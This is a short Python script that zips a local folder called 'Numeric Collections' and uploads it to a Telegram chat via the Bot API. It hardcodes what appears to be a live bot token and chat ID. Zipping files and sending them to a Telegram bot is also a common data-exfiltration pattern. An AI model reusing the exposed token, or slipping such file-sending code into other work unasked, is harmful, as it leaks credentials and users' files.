import requests
import os
import zipfile
import os
import time


bot_token = '5802606524:AAHQC-EEaBDsufdydOFOeC4rbhr1NnGPOA0'
send_document_url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
chat_id = '1518832426'



def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zip_obj:
        for foldername, subfolders, filenames in os.walk(folder_path):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zip_obj.write(file_path)

folder_path = 'Numeric Collections'
output_path = 'Numeric Collections.zip'



def send_file_Telegram():
    zip_file = open(output_path, 'rb')
    files = {'document': (output_path, zip_file)}
    data = {'chat_id': chat_id}
    response = requests.post(send_document_url, data=data, files=files)
    zip_file.close()
    if response.status_code == 200:
        print('Zip file sent successfully!')
    else:
        print('Error sending zip file:', response.text)


def telegram():
    zip_folder(folder_path, output_path)
    time.sleep(1)
    send_file_Telegram()